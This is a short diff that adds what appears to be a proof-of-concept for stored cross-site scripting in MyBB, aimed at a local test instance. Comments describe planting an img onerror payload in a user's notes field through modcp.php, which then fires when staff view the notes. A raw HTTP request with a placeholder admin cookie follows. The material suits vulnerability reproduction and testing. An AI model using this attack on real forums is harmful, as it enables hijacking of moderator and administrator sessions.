@@ -1,0 +1,7 @@
+# (1) store  POST /modcp.php action=do_editprofile uid=12 usernotes=<img onerror=...>
+# (2) fire   GET  /member.php?action=viewnotes&uid=12 (as canmodcp staff)
+
+GET /member.php?action=viewnotes&uid=12 HTTP/1.1
+Host: localhost:25850
+Cookie: mybbuser=<ADMIN uid_loginkey>
+
